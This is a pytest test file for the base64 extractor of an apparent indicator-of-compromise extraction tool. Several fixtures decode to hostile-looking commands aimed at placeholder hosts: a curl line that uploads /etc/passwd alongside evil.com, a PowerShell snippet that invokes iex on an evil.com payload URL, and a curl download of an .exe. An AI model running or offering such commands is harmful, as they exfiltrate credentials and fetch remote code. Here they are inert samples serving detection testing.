import pytest
from iocx.extractors.base64 import extract

def test_basic_base64_decoding():
    text = "aGVsbG8gd29ybGQ="
    assert extract(text) == ["aGVsbG8gd29ybGQ= (decoded: hello world)"]

def test_multiple_base64_strings():
    text = "aGVsbG8= IHdvcmxk"
    assert extract(text) == [
    "aGVsbG8= (decoded: hello)",
    "IHdvcmxk (decoded:  world)"
    ]

def test_ignores_invalid_base64():
    text = "notbase64@@@"
    assert extract(text) == []

def test_url_command_string():
    text = "aHR0cHM6Ly9ldmlsLmNvbS9wYXlsb2FkLnBocCBjdXJsIC1GIC9ldGMvcGFzc3dk"
    assert extract(text) == ["aHR0cHM6Ly9ldmlsLmNvbS9wYXlsb2FkLnBocCBjdXJsIC1GIC9ldGMvcGFzc3dk (decoded: https://evil.com/payload.php curl -F /etc/passwd)"]

def test_base64_json_with_multiple_iocs():
    text = "eyJ1cmwiOiAiaHR0cDovL21hbGljaW91cy5zaXRlL2Rvd25sb2FkIiwgImRvbWFpbiI6ICJtYWxpY2lvdXMuc2l0ZSIsICJpcCI6ICIxOTIuMTY4LjAuMSJ9"
    assert extract(text) == [
        "eyJ1cmwiOiAiaHR0cDovL21hbGljaW91cy5zaXRlL2Rvd25sb2FkIiwgImRvbWFpbiI6ICJtYWxpY2lvdXMuc2l0ZSIsICJpcCI6ICIxOTIuMTY4LjAuMSJ9 (decoded: {\"url\": \"http://malicious.site/download\", \"domain\": \"malicious.site\", \"ip\": \"192.168.0.1\"})"
    ]

def test_base64_powershell_payload():
    text = "JAB1AHIAbAAgAD0AIAAiAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAGUAeABlACIAOwAgAGkAZQB4ACAAJAB1AHIAbAA="
    assert extract(text) == [
        "JAB1AHIAbAAgAD0AIAAiAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAGUAeABlACIAOwAgAGkAZQB4ACAAJAB1AHIAbAA= (decoded: $\x00u\x00r\x00l\x00 \x00=\x00 \x00\"\x00h\x00t\x00t\x00p\x00:\x00/\x00/\x00e\x00v\x00i\x00l\x00.\x00c\x00o\x00m\x00/\x00p\x00a\x00y\x00l\x00o\x00a\x00d\x00.\x00e\x00x\x00e\x00\"\x00;\x00 \x00i\x00e\x00x\x00 \x00$\x00u\x00r\x00l\x00)"
    ]


def test_nested_base64_no_recursion():
    text = "YUdWc2JHOGdkMmxrYVc1bGNpNXNhVzVyYjNScGJtYz0="
    assert extract(text) == [
        "YUdWc2JHOGdkMmxrYVc1bGNpNXNhVzVyYjNScGJtYz0= (decoded: aGVsbG8gd2lkaW5lci5saW5rb3Rpbmc=)"
    ]


def test_long_multiline_base64_payload():
    text = (
        "U2VydmVyOiBodHRwOi8vYmFkLXNpdGUuZXhhbXBsZS9kb3dubG9hZD8xMjM0NTYKUGF5bG9hZDogL3RtcC9maWxlLmV4ZQpDb21tYW5kOiBjdXJsIC1PIGZpbGUuZXhlIGh0dHA6Ly9iYWQtc2l0ZS5leGFtcGxlL2ZpbGUuZXhl"
    )
    assert extract(text) == [
        "U2VydmVyOiBodHRwOi8vYmFkLXNpdGUuZXhhbXBsZS9kb3dubG9hZD8xMjM0NTYKUGF5bG9hZDogL3RtcC9maWxlLmV4ZQpDb21tYW5kOiBjdXJsIC1PIGZpbGUuZXhlIGh0dHA6Ly9iYWQtc2l0ZS5leGFtcGxlL2ZpbGUuZXhl (decoded: Server: http://bad-site.example/download?123456\nPayload: /tmp/file.exe\nCommand: curl -O file.exe http://bad-site.example/file.exe)"
    ]
